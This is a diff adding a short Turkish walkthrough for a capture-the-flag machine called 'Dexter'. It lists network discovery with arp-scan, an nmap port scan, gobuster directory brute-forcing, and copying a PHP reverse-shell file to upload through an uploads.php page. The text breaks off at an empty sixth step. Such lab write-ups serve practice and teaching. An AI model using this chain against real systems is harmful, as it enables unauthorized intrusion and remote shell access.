@@ -1,0 +1,7 @@
+BOT CHALLENGES: DEXTER MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.139 bulundu.
+2 - nmap -sT -A -p- 192.168.2.139
+3 - gobuster dir -u http://192.168.2.139/Panel/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+4 - cp /usr/share/webshells/php/php-reverse-shell.php .
+5 - http://192.168.2.139/Panel/uploads.php
+6 - 
